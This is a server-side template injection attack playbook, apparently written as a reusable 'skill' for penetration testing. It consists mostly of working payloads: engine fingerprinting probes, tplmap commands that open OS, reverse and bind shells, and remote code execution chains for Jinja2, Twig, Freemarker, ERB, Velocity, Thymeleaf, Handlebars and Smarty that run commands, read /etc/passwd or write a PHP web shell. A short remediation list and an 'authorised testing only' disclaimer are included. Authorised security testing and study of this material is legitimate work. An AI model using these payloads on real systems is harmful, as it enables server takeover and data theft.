# Server-Side Template Injection (SSTI) — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter)
**OWASP Mapping:** A03:2021 – Injection
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: ssti-v2
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A03:2021-Injection
tags:
  - ssti
  - template-injection
  - web-application
  - T1190
  - T1059
  - T1203
environments:
  - web
  - python
  - java
  - node
  - ruby
  - php
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Entry Point Enumeration

Template injection appears in:
- Email templates / notification previews
- Error pages / 404 templates
- Content management systems (Joomla, WordPress plugins)
- Web frameworks with template rendering
- Email/PDF generation
- Markdown editors

### 1.2 Template Detection Payloads (PayloadsAllTheThings + HackTricks)

**Universal detection payloads:**
```
${7*7}
{{7*7}}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
${7*7} (JSP)
{{7*'7'}} (test type)
```

**Fingerprint template engines:**

| Payload | Engine (if 49 or similar) |
|---|---|
| `${7*7}` | JSP/Java, Twig, Freemarker, Velocity |
| `{{7*7}}` | Jinja2, Twig, Liquid, Mustache |
| `<%= 7*7 %>` | ERB (Ruby) |
| `#{7*7}` | Thymeleaf |
| `*{7*7}` | Thymeleaf |
| `{{7*'7'}}` | Jinja2 (returns `7777777`), Twig (returns `49`) |
| `{{7}}` vs `{{7*7}}` | Distinguish engines |

**Deep probing:**
```
{{7*'7'}} → 7777777 (Jinja2) or 49 (Twig)
${'7'*7} → 7777777 (Freemarker)
<%= '7' * 7 %> → 7777777 (ERB)
{{7..__class__}} → Python introspection (Jinja2)
```

### 1.3 Automated Detection

**tplmap:**
```bash
tplmap -u "https://target.com/page?name=test"
tplmap -u "https://target.com/page?name=test" --os-shell
tplmap -u "https://target.com/page?name=test" --reverse-shell 127.0.0.1 4444
tplmap -u "https://target.com/page?name=test" --engine Jinja2
tplmap -u "https://target.com/page?name=test" --tamper
```

**Nuclei SSTI templates:**
```bash
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/ssti/ -jsonl ssti.jsonl
```

---

## 2. Confirmation

### 2.1 Math Test Confirmation

```bash
# Send and verify response
curl "https://target.com/page?name={{7*7}}"
# Response contains 49 → SSTI confirmed

curl "https://target.com/page?name=${7*7}"
# Response contains 49 → SSTI confirmed (JSP/Java)
```

### 2.2 Engine Identification

| Response to `{{7*'7'}}` | Engine |
|---|---|
| `7777777` | Jinja2 (Python) |
| `49` | Twig (PHP) |
| Error | Possibly Freemarker/ERB/Velocity |

---

## 3. Exploitation

### 3.1 Jinja2 (Python) RCE

**Basic RCE chain:**
```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

**Short RCE payloads:**
```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
```

**Full exploitation (find subprocess):**
```jinja2
{{''.__class__.__mro__[2].__subclasses__()}}
# Find subprocess.Popen index, then:
{{''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
```

**Without quotes (filter bypass):**
```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

### 3.2 Twig (PHP) RCE

```twig
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{['id']|map('system')}}
{{['id',0]|sort('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{'/etc/passwd'|file_excerpt(1,30)}}
{{include('/etc/passwd')}}
{{system('id')}}
```

### 3.3 Freemarker (Java) RCE

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign rt="freemarker.template.utility.JythonRuntime"?new()><@rt>import os;os.popen("id").read()</@rt>
${"freemarker.template.utility.Execute"?new()("id")}
```

### 3.4 ERB (Ruby) RCE

```erb
<%= system("id") %>
<%= %x(id) %>
<%= `id` %>
<%= File.open("/etc/passwd").read %>
```

### 3.5 Velocity (Java) RCE

```velocity
#set($x = "")#set($rt = $x.class.forName("java.lang.Runtime"))#set($exec = $rt.getRuntime().exec("id"))$exec
#set($s="")#set($u=$s.class.forName("java.lang.StringBuilder"))#set($i=$s.class.forName("java.lang.Runtime").getRuntime().exec("id"))...
```

### 3.6 Thymeleaf (Java) RCE

```thymeleaf
${T(java.lang.Runtime).getRuntime().exec('id')}
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

### 3.7 Handlebar/Mustache (Node.js) RCE

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### 3.8 Smarty (PHP) RCE

```smarty
{system('id')}
{php}system('id');{/php}
{$smarty.version}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}
```

---

## 4. Tool-Specific Guidance

### 4.1 tplmap (Full Workflow)
```bash
# Install
git clone https://github.com/epinna/tplmap
cd tplmap && pip install -r requirements.txt

# Detect
python3 tplmap.py -u "https://target.com/page?name=test"

# Reverse shell
python3 tplmap.py -u "https://target.com/page?name=test" --os-shell

# Bind shell
python3 tplmap.py -u "https://target.com/page?name=test" --bind-shell

# Proxy
python3 tplmap.py -u "https://target.com/page?name=test" --proxy http://127.0.0.1:8080
```

### 4.2 Burp Suite SSTI
1. Send request to Repeater
2. Inject `{{7*7}}` and `${7*7}` in each parameter
3. Grep response for `49`
4. If found, use tplmap with `--engine` flag

---

## 5. PoC Generation

### PoC Template

```markdown
## SSTI — [FINDING_ID]

**URL:** https://target.com/page
**Parameter:** name
**Engine:** Jinja2 / Twig / Freemarker / ERB / Velocity / Thymeleaf

### Payload
```
{{7*7}}
```

### Evidence
```
Response contains: 49
```

### Impact
- RCE: YES/NO
- File read: YES/NO
- Environment disclosure: YES/NO

### Remediation
- Never pass user input to templates
- Use template sandboxing (Jinja2 sandbox)
- Allow-list template contexts
- Disable dangerous functions

### Reproduction Steps
1. Send `?name={{7*7}}` → observe `49`
2. Send `?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
3. Observe command output
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Engine identified correctly
- [ ] RCE tested only in sandbox
- [ ] No production damage
- [ ] Payloads documented

---

## 7. Related Techniques

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1059 | Command and Scripting Interpreter | RCE |
| T1203 | Exploitation for Client Execution | Impact |
| T1005 | Data from Local System | File read |

---

## 8. References

- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- tplmap: https://github.com/epinna/tplmap
- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*